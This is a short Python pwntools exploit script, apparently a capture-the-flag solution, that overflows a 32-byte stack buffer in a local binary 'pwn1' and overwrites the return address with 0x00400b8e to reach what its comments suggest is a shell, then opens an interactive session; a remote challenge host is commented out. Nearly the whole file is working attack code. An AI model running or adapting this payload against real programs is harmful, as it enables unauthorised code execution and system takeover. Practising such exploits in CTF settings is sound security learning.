from pwn import *
context(arch = 'amd64', os = 'linux')

# # p = remote('game.sigflag.at', 3041)
p = process("./pwn1")
print(p.recvuntil(b">", drop=False))



# payload = "AAAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRSAAAAA"
# payload += p32(0xdeadbeef)
# Buffer: 32
# Input: 48
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF
# 32 A
# BC = rbp
# 

payload = 32 * b"A"
# 0x00400b8e
payload += b"\x8e\x0b\x40\x00\x00\x00\x00\x00"

# we want to jump to 0x00400b8e
# 0x00400b8e: pop r
# payload += p64(0x00400b8e)

print(payload)

p.sendline(payload)
p.interactive()

# /bin/bash 00400b8e